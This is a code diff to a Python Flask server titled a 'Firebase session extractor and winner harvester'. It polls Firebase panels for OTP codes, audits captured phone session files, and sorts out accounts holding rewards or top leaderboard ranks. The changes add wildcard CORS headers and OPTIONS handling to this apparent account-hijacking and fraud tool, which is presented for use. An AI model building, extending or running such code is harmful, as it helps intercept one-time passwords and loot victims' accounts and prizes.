@@ -1,6 +1,6 @@
 """
 ===================================================================================
-FIREBASE AUTOMATED SESSION EXTRACTOR & WINNER HARVESTER (50 WORKERS)
+FIREBASE AUTOMATED SESSION EXTRACTOR & WINNER HARVESTER (50 WORKERS + CORS)
 -----------------------------------------------------------------------------------
 CREATED WITH LOVE FOR HIMANSHU KUMAR BY ONYX v67
 ===================================================================================
@@ -44,6 +44,14 @@ HEADERS = {
 
 app = Flask(__name__)
 
+# Add CORS headers to all responses
+@app.after_request
+def add_cors_headers(response):
+    response.headers["Access-Control-Allow-Origin"] = "*"
+    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
+    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+    return response
+
 LATEST_INSPECTED_DEVICES = []
 
 def get_device_map() -> Dict:
@@ -67,7 +75,6 @@ def fetch_firebase_otp(panel_url: str, client_id: str, existing_keys: Optional[s
     start_time = time.time()
     cutoff_ts = max(0, min_ts - 60000)
 
-    # Fast polling loop with 0.8s interval
     while time.time() - start_time < timeout_sec:
         for url in endpoints:
             try:
@@ -353,8 +360,11 @@ def audit_session_file(session_file: str, device_map: Dict) -> Dict:
 def index():
     return send_file(os.path.join(HERE, "index.html"))
 
-@app.route('/api/inspect', methods=['POST'])
+@app.route('/api/inspect', methods=['POST', 'OPTIONS'])
 def api_inspect():
+    if request.method == 'OPTIONS':
+        return jsonify({"status": "ok"}), 200
+
     global LATEST_INSPECTED_DEVICES
     data = request.json or {}
     use_index = data.get("use_index")
@@ -466,15 +476,12 @@ def api_audit():
             if res["status"] == "ACTIVE":
                 clean_sessions.append(res["phone"])
 
-            # Check if Winner
             if res["is_winner"] or res["has_rewards"] or len(res["rewards"]) > 0:
                 winners.append(res)
 
-            # Check if Top 22 Leaderboard
             elif res["rank"] is not None and isinstance(res["rank"], int) and res["rank"] <= 22:
                 top22.append(res)
 
-    # Save summary JSON files on disk automatically
     try:
         json.dump(winners, open(os.path.join(HERE, "all_winners_found.json"), "w"), indent=2)
         json.dump(top22, open(os.path.join(HERE, "top22_leaderboard.json"), "w"), indent=2)
@@ -504,5 +511,5 @@ def api_export():
     return jsonify({"error": "File not generated yet. Run audit first."}), 404
 
 if __name__ == "__main__":
-    print(f"\n⚡ Starting 50-Worker Turbo Winner Harvester Web App on http://127.0.0.1:5000 ...\n")
+    print(f"\n⚡ Starting 50-Worker CORS Backend Server on http://127.0.0.1:5000 ...\n")
     app.run(host="0.0.0.0", port=5000, debug=False)
